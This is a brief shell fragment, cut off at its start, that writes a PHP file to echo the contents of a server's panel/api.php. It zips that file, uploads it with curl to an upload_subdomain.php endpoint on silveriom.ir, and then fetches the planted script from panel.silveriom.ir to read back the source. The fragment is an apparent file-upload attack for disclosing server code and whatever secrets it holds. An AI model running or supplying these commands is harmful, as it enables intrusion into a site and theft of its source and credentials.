<?php echo file_get_contents('/home/h417440/public_html/panel/api.php'); EOF
zip -r read_api2.zip read_api2.php
curl -s -X POST -F "file=@read_api2.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/read_api2.php" | head -n 30